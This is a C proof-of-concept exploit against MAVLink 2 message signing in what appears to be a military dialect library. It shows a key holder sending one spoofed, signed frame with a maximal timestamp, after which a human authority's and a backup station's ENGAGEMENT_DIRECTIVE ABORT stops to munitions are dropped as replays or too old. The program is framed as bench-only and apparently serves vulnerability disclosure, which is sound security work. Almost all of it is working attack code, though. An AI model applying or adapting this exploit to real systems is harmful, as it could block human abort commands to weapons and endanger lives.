/*
 * MAVLink 2 signing (MAVLink-M C library): a KEY HOLDER can permanently stop
 * another system's signed frames from being accepted, stops included.
 *
 * MAVLink-M SAFETY BOUNDARIES says the shared key lets "any holder sign as any
 * system ID ... an aircraft or munition that can be lost included", and that
 * the receiver "never rejects a stop for its time". mavlink_signature_check()
 * has no upper bound on the timestamp, so one validly signed frame claiming the
 * human authority's (sysid, compid, link_id) with timestamp 2^48-1 makes every
 * later genuine frame from that authority a "replay". It also drags the
 * receiver's global timestamp forward, so a stream it has not heard yet (a
 * backup station) is rejected as too old.
 *
 * Bench-only, in-process. The message used is ENGAGEMENT_DIRECTIVE ABORT,
 * the dialect's common stop, so the PoC shows a stop being lost.
 */
#include <stdio.h>
#include <string.h>
#include <time.h>

#define MAVLINK_COMM_NUM_BUFFERS 4
#include "military/mavlink.h"

enum { CH_GCS = 0, CH_ROGUE = 1, CH_RX = 2, CH_BACKUP = 3 };

static const char *status_name(uint8_t s)
{
    switch (s) {
    case MAVLINK_SIGNING_STATUS_OK: return "OK";
    case MAVLINK_SIGNING_STATUS_BAD_SIGNATURE: return "BAD_SIGNATURE";
    case MAVLINK_SIGNING_STATUS_NO_STREAMS: return "NO_STREAMS";
    case MAVLINK_SIGNING_STATUS_TOO_MANY_STREAMS: return "TOO_MANY_STREAMS";
    case MAVLINK_SIGNING_STATUS_OLD_TIMESTAMP: return "OLD_TIMESTAMP";
    case MAVLINK_SIGNING_STATUS_REPLAY: return "REPLAY";
    default: return "?";
    }
}

static uint64_t now_ts(void)
{
    /* 10 us units since 2015-01-01 */
    return ((uint64_t)time(NULL) - 1420070400ULL) * 100000ULL;
}

static uint8_t key[32];
static mavlink_signing_t gcs_sig, rogue_sig, backup_sig, rx_sig;
static mavlink_signing_streams_t rx_streams;

static void setup_tx(uint8_t chan, mavlink_signing_t *s, uint8_t link_id, uint64_t ts)
{
    memset(s, 0, sizeof(*s));
    memcpy(s->secret_key, key, sizeof(key));
    s->link_id = link_id;
    s->timestamp = ts;
    s->flags = MAVLINK_SIGNING_FLAG_SIGN_OUTGOING;
    mavlink_get_channel_status(chan)->signing = s;
}

/* Build an ENGAGEMENT_DIRECTIVE ABORT for every engagement (sequence 0xFFFF),
 * sent to every system, as the dialect's network-wide stop. */
static uint16_t build_abort(uint8_t chan, uint32_t sysid, uint8_t compid, uint8_t *buf)
{
    mavlink_message_t msg;
    uint8_t track_uid[16] = {0};
    mavlink_msg_engagement_directive_pack_chan(sysid, compid, chan, &msg,
        (uint64_t)time(NULL) * 1000000ULL, 0, 0, track_uid, 0xFFFF, 0,
        INT32_MAX, INT32_MAX, 0.0f, MAVLINK_M_ENGAGEMENT_DIRECTIVE_ABORT, (uint8_t)sysid);
    return mavlink_msg_to_send_buffer(buf, &msg);
}

static int deliver(const uint8_t *buf, uint16_t len, const char *label)
{
    mavlink_message_t out;
    mavlink_status_t st;
    int got = 0;
    for (uint16_t i = 0; i < len; i++) {
        if (mavlink_parse_char(CH_RX, buf[i], &out, &st) &&
            out.msgid == MAVLINK_MSG_ID_ENGAGEMENT_DIRECTIVE) {
            got = 1;
        }
    }
    printf("  %-52s -> %-8s (signing status %s)\n", label, got ? "ACCEPTED" : "DROPPED",
           status_name(rx_sig.last_status));
    return got;
}

int main(void)
{
    uint8_t buf[MAVLINK_MAX_PACKET_LEN];
    uint16_t n;
    for (int i = 0; i < 32; i++) key[i] = (uint8_t)(0xA5 ^ i);

    const uint64_t t = now_ts();
    setup_tx(CH_GCS, &gcs_sig, 0, t);
    setup_tx(CH_BACKUP, &backup_sig, 0, t);
    /* the rogue holder (e.g. a lost munition, sysid 42) has the network key */
    setup_tx(CH_ROGUE, &rogue_sig, 0, 0xFFFFFFFFFFFEULL);

    memset(&rx_sig, 0, sizeof(rx_sig));
    memcpy(rx_sig.secret_key, key, sizeof(key));
    rx_sig.timestamp = t;
    memset(&rx_streams, 0, sizeof(rx_streams));
    mavlink_get_channel_status(CH_RX)->signing = &rx_sig;
    mavlink_get_channel_status(CH_RX)->signing_streams = &rx_streams;

    printf("1. human authority (sysid 255/190, link 0) sends a signed network-wide ABORT\n");
    n = build_abort(CH_GCS, 255, 190, buf); deliver(buf, n, "authority ABORT #1");
    n = build_abort(CH_GCS, 255, 190, buf); deliver(buf, n, "authority ABORT #2");

    printf("2. key holder signs ONE frame as sysid 255/190, link 0, timestamp 2^48-1\n");
    n = build_abort(CH_ROGUE, 255, 190, buf);
    deliver(buf, n, "rogue frame claiming the authority's stream");

    printf("3. the authority's later stops\n");
    int any = 0;
    for (int i = 0; i < 3; i++) {
        char label[64];
        snprintf(label, sizeof label, "authority ABORT #%d", i + 3);
        n = build_abort(CH_GCS, 255, 190, buf);
        any |= deliver(buf, n, label);
    }

    printf("4. a backup station the receiver has not heard yet (sysid 254/190)\n");
    n = build_abort(CH_BACKUP, 254, 190, buf);
    any |= deliver(buf, n, "backup station ABORT");

    printf("\nRESULT: %s\n", any ? "not reproduced"
           : "VULNERABLE: one key-holder frame silences the authority's and a backup's stops");
    return 0;
}
